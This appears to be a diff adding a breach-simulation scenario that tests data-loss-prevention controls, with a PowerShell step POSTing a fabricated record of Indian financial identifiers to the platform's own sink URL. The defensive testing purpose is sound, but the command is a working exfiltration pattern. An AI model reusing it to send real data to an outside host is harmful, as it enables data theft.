@@ -1,0 +1,69 @@
+id: dlp-exfiltration-sink-https
+name: DLP Exfiltration Validation — Sink-Verified HTTPS Channel
+description: >
+  Attempts to exfiltrate the same synthetic multi-type sensitive record
+  used by dlp-exfiltration-validation.yaml (fabricated PAN, Aadhaar,
+  SWIFT/BIC, UPI VPA, and credit-card patterns) via a generic HTTPS POST,
+  verified by a destination-side receipt rather than a local self-reported
+  marker.
+
+  First channel of the sink-verified generation of DLP testing (see
+  docs/superpowers/specs/2026-08-19-dlp-exfiltration-sink-service-design.md).
+  Unlike dlp-exfiltration-validation.yaml's 5 local-marker-only steps, this
+  step's verdict comes from whether the platform's own sink endpoint
+  actually received the payload -- ground truth for whether the data left
+  the endpoint, not an inference from a local file/clipboard/print-queue
+  check. Deliberately kept as its own standalone scenario rather than a
+  6th step in the existing file: mixing verification models within one
+  file would muddy what each step actually proves.
+
+  Safety: all synthetic data is fabricated ([BAS-SIM-DLP] tagged), never
+  real. The sink endpoint stores only a hash of the received payload, never
+  the raw content. Windows only.
+author: Audspect Research
+executable: true
+supported_os: [windows]
+tags:
+  - dlp
+  - data-protection-validation
+  - exfiltration
+  - windows
+  - mitre-attack
+  - bfsi
+  - india
+mitre_phases:
+  - collection
+  - exfiltration
+
+steps:
+  - name: "DLP Validation — Sink-Verified HTTPS Exfiltration (T1567)"
+    technique_id: T1567
+    detection_profiles:
+      - windows_dlp_exfiltration
+    framework: custom
+    executor: powershell
+    requires_priv: user
+    timeout_sec: 30
+    fidelity: telemetry-safe
+    production_safe: true
+    risk: low
+    blast_radius: "POSTs a synthetic multi-type sensitive record to the platform's own sink endpoint over HTTPS. No real data, no external destination -- the receiving endpoint is this same on-prem deployment."
+    reversible: true
+    telemetry:
+      - "Sysmon EID 3: network connection to the orchestrator's own HTTPS port"
+    detection:
+      - "DLP: outbound HTTPS POST body matching regulated-data patterns"
+    command: |
+      $ErrorActionPreference = 'SilentlyContinue'
+      $csvContent = "[BAS-SIM-DLP] CustomerID,PAN,Aadhaar,SWIFT,UPI,CreditCard`nBAS-SIM-SINK,ABCDE1234F,123456789012,SBININBBXXX,fake.user@upi,4111111111111111"
+      try {
+        Invoke-RestMethod -Uri '{{SINK_URL}}' -Method Post -Body (@{token='{{SINK_TOKEN}}'; payload=$csvContent; channel='https-post'} | ConvertTo-Json) -ContentType 'application/json' -TimeoutSec 10 | Out-Null
+        Write-Output "EXEC T1567: multi-type sensitive record POSTed over HTTPS. [BAS-SIM-DLP-SINK-HTTPS]"
+      } catch {
+        Write-Output "EXEC T1567: HTTPS POST to sink was blocked or failed before completing. [BAS-SIM-DLP-SINK-HTTPS]"
+      }
+      # No local DLP_OBSERVATION marker here -- this step's verdict comes
+      # entirely from whether the sink endpoint received the token, resolved
+      # server-side by internal/verifysync, not from anything this script
+      # can locally confirm.
+    cleanup: ""
